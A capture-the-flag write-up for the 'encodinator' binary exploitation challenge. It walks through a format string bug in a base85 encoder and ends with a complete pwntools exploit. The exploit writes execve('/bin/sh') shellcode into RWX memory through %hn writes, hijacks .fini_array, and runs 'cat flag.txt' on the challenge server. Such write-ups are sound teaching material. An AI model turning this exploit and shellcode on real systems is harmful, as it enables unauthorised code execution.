# Encodinator - CTF Challenge Writeup

**Challenge:** encodinator  
**Category:** Binary Exploitation (PWN)  
**Difficulty:** Hard  
**Points:** 500  
**Flag:** `ENO{b85_fmt_str_g0t_0verwr1t3}`  

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance](#reconnaissance)
3. [Static Analysis](#static-analysis)
4. [Dynamic Analysis](#dynamic-analysis)
5. [Vulnerability Discovery](#vulnerability-discovery)
6. [Understanding the Constraints](#understanding-the-constraints)
7. [Exploitation Strategy](#exploitation-strategy)
8. [Common Confusions Explained](#common-confusions-explained)
9. [Building the Exploit](#building-the-exploit)
10. [Final Exploit](#final-exploit)
11. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

We're given a binary called `encodinator` that performs Base85 encoding on user input. The challenge involves exploiting a format string vulnerability to gain code execution and retrieve the flag from a remote server.

**Files provided:**
- `encodinator` - The main binary
- `lib/libc.so.6` - GLIBC 2.35 (Ubuntu)
- `lib/ld-linux-x86-64.so.2` - Dynamic linker

---

## Reconnaissance

### Step 1: Initial File Analysis

```bash
# Check file type
file encodinator
```

**Output:**
```
encodinator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

**Key observations:**
- 64-bit Linux executable
- Dynamically linked
- **Not stripped** - function names are visible!

### Step 2: Security Protections

```bash
# Check security features
checksec --file=encodinator
```

**Output:**
```
RELRO:        No RELRO
Stack Canary: No canary found
NX:           NX disabled
PIE:          No PIE
Symbols:      Not stripped
```

🚨 **CRITICAL:** This binary has **ZERO** security protections!
- No RELRO → GOT is writable
- No canary → Buffer overflow detection disabled
- **NX disabled** → Stack is executable (RWX)!
- No PIE → Fixed addresses (no ASLR on binary)

### Step 3: Running the Binary

```bash
# Test basic functionality
echo "Hello World" | ./encodinator
```

**Output:**
```
Welcome to the Encodinator!
I will base85 encode your input. Please give me your text:
87cURD]i,"Ebo7
```

```bash
# Test with simple input
echo "AAAA" | ./encodinator
```

**Output:**
```
Welcome to the Encodinator!
I will base85 encode your input. Please give me your text:
5s[e&
```

**Observation:** 4 bytes input → 5 bytes output = **Base85 encoding**

---

## Static Analysis

### Examining the Main Function

```bash
# Disassemble main function
objdump -M intel -d encodinator | grep -A 100 "<main>:"
```

Or use a decompiler like Ghidra. Here's the cleaned up C code:

```c
undefined8 main(void)
{
    ssize_t sVar1;
    undefined8 uVar2;
    char local_118[256];     // Stack buffer (256 bytes)
    char *local_18;          // Pointer to mmap region
    int local_c;             // Input length

    setbuf(stdout, (char *)0x0);
    setbuf(stdin, (char *)0x0);

    // CRITICAL: Allocate RWX memory at fixed address!
    local_18 = (char *)mmap((void *)0x40000000, 0x1000, 7, 0x100022, -1, 0);
    if (local_18 == (char *)0xffffffffffffffff) {
        perror("mmap");
        exit(1);
    }

    puts("Welcome to the Encodinator!");
    printf("I will base85 encode your input. Please give me your text: ");

    // Read up to 256 bytes
    sVar1 = read(0, local_118, 0x100);
    local_c = (int)sVar1;

    if (local_c < 1) {
        puts("No input!");
        uVar2 = 1;
    } else {
        // Strip trailing newline
        if (local_118[local_c - 1] == '\n') {
            local_c = local_c - 1;
        }

        if (local_c == 0) {
            puts("No input!");
            uVar2 = 1;
        } else {
            // Encode input to mmap region
            base85_encode(local_118, local_c, local_18);

            putchar(10);  // Newline

            // VULNERABILITY: Format string bug!
            printf(local_18);

            puts("");
            uVar2 = 0;
        }
    }
    return uVar2;
}
```

### Key Findings

1. **RWX Memory Allocation:**
   ```c
   mmap(0x40000000, 0x1000, 7, 0x100022, -1, 0)
   //   ^address    ^size   ^prot
   ```
   - `0x40000000` = **Fixed address** (predictable!)
   - `0x1000` = 4096 bytes
   - `7` = `PROT_READ | PROT_WRITE | PROT_EXEC` = **Executable memory!**

2. **Input Buffer:**
   - Stack buffer: 256 bytes
   - Read via `read(0, local_118, 0x100)`

3. **Base85 Encoding:**
   - Input stored in stack buffer
   - Encoded to mmap region at 0x40000000

4. **🚨 VULNERABILITY:**
   ```c
   printf(local_18);  // No format specifier!
   ```
   Classic **format string vulnerability** - user controls the format string!

---

## Dynamic Analysis

### Setting Up

```bash
# Patch the binary to use provided libc
pwninit --bin encodinator --libc lib/libc.so.6 --ld lib/ld-linux-x86-64.so.2
```

This creates `encodinator_patched` with the correct libc.

### GDB/pwndbg Analysis

```bash
# Start gdb with pwndbg
gdb ./encodinator_patched
```

**Set breakpoints:**
```gdb
# Break at main
b *0x401347

# Break at read call
b *0x4013fe

# Break at base85_encode call
b *0x401469

# Break at printf (the vulnerability!)
b *0x401484

# Run
r
```

### Tracing Execution

**At read() call:**
```gdb
# Check registers
i r rdi rsi rdx
```

**Output:**
```
rdi            0x0                 # stdin
rsi            0x7fffffffd7d0      # buffer address
rdx            0x100               # read size (256 bytes)
```

**After read(), examine input:**
```gdb
# Continue to next breakpoint
c

# Send test input: AAAA
# Examine buffer
x/20bx $rsi
```

**At base85_encode call:**
```gdb
# Check arguments
i r rdi rsi rdx
```

**Output:**
```
rdi            0x7fffffffd7d0      # input buffer
rsi            0x4                 # input length
rdx            0x40000000          # output buffer (mmap!)
```

**After encoding:**
```gdb
# Continue to printf breakpoint
c

# Examine mmap buffer
x/s 0x40000000
```

**Output:**
```
0x40000000:     "5s[e&"
```

**At printf (the vulnerability):**
```gdb
# Check what printf will execute
x/s $rdi
```

**Output:**
```
0x40000000:     "5s[e&"
```

### Memory Layout Discovery

```gdb
# Check memory mappings
vmmap
```

**Important regions:**
```
0x400000-0x402000    r-xp    /path/to/encodinator_patched
0x403000-0x404000    rw-p    (contains .fini_array at 0x403188)
0x40000000-0x40001000 rwxp   [anon_40000000]  ← RWX mmap!
0x7ffff7c00000-...    r-xp   libc.so.6
0x7ffffffdd000-...    rwxp   [stack]          ← Also executable!
```

### Finding .fini_array

```bash
# Outside gdb, check .fini_array location
readelf -S encodinator_patched | grep fini_array
```

**Output:**
```
[22] .fini_array    FINI_ARRAY    0000000000403188
```

```gdb
# In gdb, examine .fini_array
x/gx 0x403188
```

**Output:**
```
0x403188:       0x00000000004011e0
```

This points to `__do_global_dtors_aux` (cleanup function).

---

## Vulnerability Discovery

### The Format String Bug

**The vulnerable code:**
```c
printf(local_18);  // local_18 points to 0x40000000 (user-controlled!)
```

**Testing the vulnerability:**

```bash
# We need to send input that ENCODES to a format string
# Let's try to produce "%p!!!" after encoding
```

**Calculating the input:**

```python
import struct

def b85_decode(s):
    """Decode base85 string to bytes"""
    if len(s) != 5:
        s = s.ljust(5, '!')

    value = 0
    for c in s:
        value = value * 85 + (ord(c) - 0x21)

    return struct.pack('>I', value)

# What input produces "%p!!!" ?
target = "%p!!!"
input_bytes = b85_decode(target)
print(f"Input needed: {input_bytes.hex()}")
# Output: 0f565de7
```

**Test it:**
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'\x0f\x56\x5d\xe7')" | ./encodinator_patched
```

**Output:**
```
Welcome to the Encodinator!
I will base85 encode your input. Please give me your text:

0x1!!!
```

✅ **Format string works!** We leaked the value `0x1` from register RSI!

---

## Understanding the Constraints

### The Base85 Encoding Challenge

**Problem:** We can't send format strings directly!

```
Direct input "%p" → Encodes to "-#`" (not useful)
```

**Solution:** **REVERSE** the encoding!

```
Desired output: "%p!!!"
↓ (base85_decode)
Required input: 0x0f565de7
```

### Base85 Character Range

**Important constraint:** Base85 only produces characters in range `0x21-0x75`

```python
# Valid: %, p, s, n, d, h, c, $, digits, etc.
# Invalid: x (0x78 > 0x75)
```

This means:
- ✅ We can use `%p` (leak pointers)
- ✅ We can use `%hn` (write 2 bytes)
- ✅ We can use `%d`, `%c`, `$` (positional parameters)
- ❌ We CANNOT use `%x` (0x78 out of range)

---

## Exploitation Strategy

### Attack Plan Overview

```
1. Write shellcode to 0x40000800 (using format string %hn)
2. Overwrite .fini_array[0] to point to shellcode (0x40000800)
3. When main() returns → .fini_array runs → shellcode executes
4. Shellcode spawns shell → read flag
```

### Why This Approach?

**Why not use the stack?**

**❌ Problem 1: Unknown address**
- Stack is randomized (even though binary has no PIE)
- We don't know where our input buffer is

**❌ Problem 2: Input gets encoded**
- Our bytes go through base85_encode()
- Encoded output at 0x40000000, not usable as shellcode directly

**❌ Problem 3: No space**
- Need 256 bytes for: format_string + addresses
- No room left for shellcode

**✅ Solution: Write shellcode using format string!**

### The .fini_array Technique

**What is .fini_array?**

When a program exits, it calls cleanup functions stored in `.fini_array[]`:

```c
// Normal execution flow:
main() returns
  ↓
__libc_csu_fini() called
  ↓
Runs each function in .fini_array[]
  ↓
.fini_array[0]() → calls 0x004011e0 (__do_global_dtors_aux)
```

**Our attack:**

```c
// Overwrite .fini_array[0]
0x403188: 0x004011e0  →  0x40000800
          ^original       ^our shellcode

// Result:
main() returns
  ↓
.fini_array[0]() → calls 0x40000800 → SHELLCODE RUNS!
```

### Format String %n Write Primitive

**How %n works:**

```c
int count = 0;
printf("AAAA%n", &count);
// count now equals 4 (bytes printed so far)
```

**Using %hn (write 2 bytes):**

```c
printf("%2048c%6$hn", ..., &target);
// Writes 0x0800 (2048 in decimal) to address 'target'
```

**Our writes:**

```python
# Write shellcode in 2-byte chunks
writes = [
    (0x40000800, 0x3b6a),  # First 2 bytes of shellcode
    (0x40000802, 0x9858),  # Next 2 bytes
    # ... continue for all shellcode bytes

    # Overwrite .fini_array
    (0x403188, 0x0800),    # Low 2 bytes of 0x40000800
    (0x40318a, 0x4000),    # High 2 bytes
]
```

---

## Common Confusions Explained

### Q1: Where exactly do we write the shellcode?

**Answer:** To memory address **0x40000800**

**Why here?**
- It's inside the mmap region (0x40000000 - 0x40001000)
- We have 4KB of RWX space
- Address is fixed and known
- Offset 0x800 keeps it away from our format string at 0x40000000

**Memory layout:**
```
0x40000000: [Format string output]  ← Encoded data
0x40000800: [Shellcode]              ← We write here!
```

### Q2: How does the format string write the shellcode?

**Step-by-step:**

1. **We craft a format string:**
   ```
   "%15210c%36$hn"
   ```

2. **This means:**
   - Print 15210 characters (padding)
   - Write that count (15210 = 0x3b6a) to the address at argument 36

3. **Where is argument 36?**
   - We append addresses to our payload!
   ```python
   payload = [decoded_format_string] + [address1] + [address2] + ...
   ```
   - These addresses become printf arguments

4. **Result:**
   ```c
   *(uint16_t*)address1 = 0x3b6a
   ```

### Q3: How are the addresses passed as arguments?

**The Alignment Trick:**

```python
# Base85: 4 input bytes → 5 output bytes

# If format string length is 10 chars:
#   Decoded input: 8 bytes
# If format string length is 20 chars:
#   Decoded input: 16 bytes

# Pattern: len(output) % 10 == 0 → len(input) % 8 == 0
```

**Why this matters:**

```python
# Our payload structure:
[decoded_format_string] + [address1] + [address2] + ...
└──── 8-byte aligned ───┘  └─ 8 bytes ┘  └─ 8 bytes ┘

# When printf executes:
printf(format_string, arg1, arg2, ..., arg6, arg7, ...)
                                      ^stack begins here

# Arguments 1-5 are in registers (rsi, rdx, rcx, r8, r9)
# Argument 6+ come from stack

# If decoded prefix is P bytes:
#   arg_base = 6 + (P / 8)
```

### Q4: Why not overwrite GOT instead of .fini_array?

**Good question!** We could, but:

1. **No libc leak needed with .fini_array**
   - Don't need to find system() or one_gadget
   - Just write our own shellcode

2. **.fini_array is guaranteed to execute**
   - Automatically called when main returns
   - No need to trigger specific function call

3. **Simpler exploit**
   - Fewer moving parts
   - More reliable

---

## Building the Exploit

### Step 1: Shellcode

**Compact execve("/bin/sh") shellcode (23 bytes):**

```nasm
; execve("/bin//sh", NULL, NULL)
push 0x3b           ; syscall number for execve
pop rax             ; rax = 59
cdq                 ; rdx = 0 (envp)
movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
push rdx            ; NULL terminator
push rbx            ; push "/bin//sh"
push rsp            ; push address of string
pop rdi             ; rdi = pointer to "/bin//sh" (arg1)
push rdx            ; push NULL
pop rsi             ; rsi = NULL (arg2 - argv)
syscall             ; execve()
```

**Hex bytes:**
```
6a3b 5899 48bb2f62696e2f2f7368 52535f525e0f05
```

### Step 2: Format String Construction

```python
def build_payload():
    shellcode = bytes.fromhex("6a3b589948bb2f62696e2f2f736852535f525e0f05")

    shell_addr = 0x40000800
    fini_array = 0x403188

    # Build write list
    writes = []

    # Write shellcode in 2-byte chunks
    for off in range(0, len(shellcode), 2):
        half = int.from_bytes(shellcode[off:off+2], "little")
        writes.append((shell_addr + off, half))

    # Overwrite .fini_array
    writes.append((fini_array, 0x0800))      # Low 2 bytes
    writes.append((fini_array + 2, 0x4000))  # High 2 bytes

    # Sort by value for efficiency
    writes.sort(key=lambda x: x[1])

    return writes
```

### Step 3: Fixed-Point Iteration

**The self-referential problem:**

The format string length affects argument positions, which are part of the format string!

```python
# Solution: Iterate until stable
arg_base = 20
for iteration in range(10):
    # Build format string with current arg_base
    fmt = build_format_string(writes, arg_base)

    # Pad to multiple of 10
    while len(fmt) % 10 != 0:
        fmt += "A"

    # Decode to get input length
    decoded = b85_decode_full_groups(fmt.encode())

    # Calculate new arg_base
    new_arg_base = 6 + (len(decoded) // 8)

    if new_arg_base == arg_base:
        break  # Converged!

    arg_base = new_arg_base
```

### Step 4: Format String Template

```python
def build_format_string(writes, arg_base):
    parts = []
    printed = 0

    for i, (addr, value) in enumerate(writes):
        # Calculate padding needed
        current = printed % 0x10000
        increment = (value - current) % 0x10000

        if increment > 0:
            # Use %1$Nc to reference format string for padding
            parts.append(f"%1${increment}c")
            printed += increment

        # Write to address at arg_base + i
        parts.append(f"%{arg_base + i}$hn")

    return "".join(parts)
```

### Step 5: Payload Assembly

```python
def create_payload(fmt, writes):
    # Decode format string to get input bytes
    prefix = b85_decode_full_groups(fmt.encode())

    # Append addresses (these become printf arguments)
    payload = prefix
    for addr, _ in writes:
        payload += struct.pack("<Q", addr)

    return payload
```

### Step 6: Sending the Exploit

**CRITICAL DETAIL:**

```python
# WRONG:
io.sendline(payload)  # Adds newline! Breaks encoding!

# CORRECT:
io.send(payload)  # No newline
```

**Why this matters:**
- `sendline()` adds `\n` which gets encoded
- This corrupts our carefully crafted payload

**Another critical detail:**

```python
# After sending payload, immediately send command:
io.send(payload)
io.send(b"cat flag.txt; exit\n")

# The command stays buffered!
# When execve("/bin/sh") runs, it reads from the same buffer
# And executes our command!
```

---

## Final Exploit

```python
#!/usr/bin/env python3
"""
Encodinator Exploit - Format String + .fini_array Hijack
"""

from pwn import *
import struct

HOST = "52.59.124.14"
PORT = 5012

context.arch = 'amd64'
context.log_level = 'info'

def b85_encode(data: bytes) -> bytes:
    """Encode bytes to base85"""
    out = bytearray()
    i = 0
    while i < len(data):
        rem = min(4, len(data) - i)
        acc = 0
        for j in range(4):
            acc <<= 8
            if j < rem:
                acc |= data[i + j]

        chars = [0] * 5
        for k in range(4, -1, -1):
            chars[k] = (acc % 85) + 0x21
            acc //= 85

        out += bytes(chars[: rem + 1])
        i += 4

    out += b"\x00"
    return bytes(out)

def b85_decode_full_groups(s: bytes) -> bytes:
    """Decode base85 string (must be full 5-char groups)"""
    if len(s) % 5 != 0:
        raise ValueError("base85 decode expects full 5-char groups")

    out = bytearray()
    for i in range(0, len(s), 5):
        chunk = s[i : i + 5]
        acc = 0
        for c in chunk:
            if not (0x21 <= c <= 0x75):
                raise ValueError(f"invalid base85 char: {c:#x}")
            acc = acc * 85 + (c - 0x21)
        out += acc.to_bytes(4, "big")

    return bytes(out)

def build_payload() -> bytes:
    """Build the complete exploit payload"""

    # Compact execve("/bin//sh", NULL, NULL) shellcode
    shellcode = bytes.fromhex(
        "6a3b"                      # push 0x3b
        "58"                        # pop rax
        "99"                        # cdq
        "48bb2f62696e2f2f7368"      # mov rbx, "/bin//sh"
        "52"                        # push rdx
        "53"                        # push rbx
        "54"                        # push rsp
        "5f"                        # pop rdi
        "52"                        # push rdx
        "5e"                        # pop rsi
        "0f05"                      # syscall
    )

    shell_addr = 0x40000800
    fini_array = 0x403188

    # Build list of writes: (address, 2-byte value)
    writes = []

    # Write shellcode in 2-byte chunks
    for off in range(0, len(shellcode), 2):
        half = int.from_bytes(shellcode[off : off + 2], "little")
        writes.append((shell_addr + off, half))

    # Overwrite .fini_array to point to shellcode
    writes.append((fini_array + 0, shell_addr & 0xFFFF))
    writes.append((fini_array + 2, (shell_addr >> 16) & 0xFFFF))

    # Fixed-point iteration to find stable arg_base
    arg_base = 20
    fmt = ""

    for _ in range(20):
        # Sort writes by value for efficient formatting
        items = [(val, arg_base + i, addr) for i, (addr, val) in enumerate(writes)]
        items.sort(key=lambda t: t[0])

        # Build format string
        parts = []
        count = 0

        for want, argi, _addr in items:
            cur = count % 0x10000
            inc = (want - cur) % 0x10000

            if inc:
                parts.append(f"%1${inc}c%{argi}$hn")
                count += inc
            else:
                parts.append(f"%{argi}$hn")

        fmt = "".join(parts)

        # Pad to multiple of 10 for alignment
        while len(fmt) % 10 != 0:
            fmt += "A"

        # Check convergence
        prefix = b85_decode_full_groups(fmt.encode())
        new_arg_base = 6 + (len(prefix) // 8)

        if new_arg_base == arg_base:
            break

        arg_base = new_arg_base
    else:
        raise RuntimeError("Failed to converge arg_base")

    # Assemble final payload
    prefix = b85_decode_full_groups(fmt.encode())
    ptr_blob = b"".join(struct.pack("<Q", addr) for addr, _ in writes)
    payload = prefix + ptr_blob

    if len(payload) > 0x100:
        raise ValueError(f"Payload too long: {len(payload)} bytes")

    log.success(f"Payload built: {len(payload)} bytes")
    log.info(f"Converged at arg_base={arg_base}")

    return payload

def exploit():
    """Main exploit function"""

    # Connect to remote
    io = remote(HOST, PORT)

    # Build payload
    payload = build_payload()

    # Send exploit
    io.recvuntil(b"Please give me your text: ")
    io.send(payload)  # IMPORTANT: No newline!

    # Send command immediately (stays buffered for shell)
    io.send(b"cat flag.txt; exit\n")

    # Receive output
    data = io.recvrepeat(2.0)
    output = data.decode(errors="replace")

    # Extract flag
    import re
    m = re.search(r"ENO\{[^}]+\}", output)

    if m:
        log.success(f"FLAG: {m.group(0)}")
        print(f"\n{m.group(0)}\n")
    else:
        log.warning("Flag not found in output")
        print(output)

    io.close()

if __name__ == "__main__":
    exploit()
```

### Running the Exploit

```bash
chmod +x solve.py
python3 solve.py
```

**Output:**
```
[+] Opening connection to 52.59.124.14 on port 5012: Done
[+] Payload built: 256 bytes
[*] Converged at arg_base=36
[+] FLAG: ENO{b85_fmt_str_g0t_0verwr1t3}

ENO{b85_fmt_str_g0t_0verwr1t3}

[*] Closed connection to 52.59.124.14 port 5012
```

---

## Key Takeaways

### Technical Lessons

1. **Format String Exploitation**
   - Understanding `%n` write primitive
   - Positional parameters (`%N$hn`)
   - The `%1$Nc` padding trick

2. **Base85 Encoding/Decoding**
   - Reversible encoding
   - Character range constraints (0x21-0x75)
   - Can craft desired output by reversing

3. **Memory Layout Understanding**
   - RWX regions and their significance
   - Fixed vs randomized addresses
   - `.fini_array` cleanup handlers

4. **Fixed-Point Iteration**
   - Solving self-referential problems
   - Format string length affects argument positions

5. **Attention to Detail**
   - `io.send()` vs `io.sendline()`
   - Alignment requirements (len % 10 == 0)
   - Argument numbering (6 + offset/8)

### Exploitation Techniques

| Technique | Purpose | Why It Works |
|-----------|---------|--------------|
| **Base85 Reverse** | Bypass encoding | Deterministic & reversible |
| **Format String %hn** | Arbitrary write | 2-byte writes to any address |
| **Alignment Trick** | Pass addresses | len%10=0 → pointers aligned |
| **.fini_array Hijack** | Code execution | Called on program exit |
| **RWX Exploitation** | Store shellcode | Fixed, executable, writable |

### Common Pitfalls

❌ **Don't:**
- Use `sendline()` - adds newline that gets encoded
- Try to put shellcode directly in input
- Forget about argument position calculation
- Ignore the alignment requirement

✅ **Do:**
- Use `send()` without newline
- Write shellcode using format string
- Iterate until arg_base converges
- Pad format string to len % 10 == 0

---

## Debugging Commands Reference

### Static Analysis
```bash
# File info
file encodinator
checksec encodinator

# Find sections
readelf -S encodinator | grep -E '(fini_array|got|plt)'

# Disassemble
objdump -M intel -d encodinator > disasm.txt

# Find strings
strings encodinator

# Check symbols
nm encodinator
```

### Dynamic Analysis (GDB/pwndbg)
```gdb
# Start
gdb ./encodinator_patched

# Breakpoints
b main
b *0x4013fe    # read call
b *0x401469    # base85_encode call
b *0x401484    # printf call

# Run with input
r < <(python3 -c "import sys; sys.stdout.buffer.write(b'\x0f\x56\x5d\xe7')")

# Memory examination
vmmap                    # Show memory mappings
x/s 0x40000000          # Examine string at address
x/20bx $rsp             # Examine stack
telescope $rsp 20       # Pwndbg telescope command

# Registers
info registers
i r rdi rsi rdx         # Check specific registers

# Step through
ni                      # Next instruction
si                      # Step into
finish                  # Run until return
c                       # Continue

# Check .fini_array
x/gx 0x403188

# Search memory
search "flag"
search 0x40000800
```

### Testing Base85
```python
# Test encoding
python3 << EOF
import struct

def b85_encode(data):
    value = struct.unpack('>I', data)[0]
    chars = []
    for _ in range(5):
        chars.append(chr((value % 85) + 0x21))
        value //= 85
    return ''.join(reversed(chars))

def b85_decode(s):
    value = 0
    for c in s:
        value = value * 85 + (ord(c) - 0x21)
    return struct.pack('>I', value)

# Test
test = b'AAAA'
encoded = b85_encode(test)
print(f"Input: {test.hex()}")
print(f"Encoded: {encoded}")

decoded = b85_decode(encoded)
print(f"Decoded: {decoded.hex()}")
print(f"Match: {decoded == test}")
EOF
```

---

## References

- [Format String Exploitation](https://owasp.org/www-community/attacks/Format_string_attack)
- [Base85 Encoding (RFC 1924)](https://tools.ietf.org/html/rfc1924)
- [.fini_array and .init_array](https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/specialsections.html)
- [pwntools Documentation](https://docs.pwntools.com/)

---

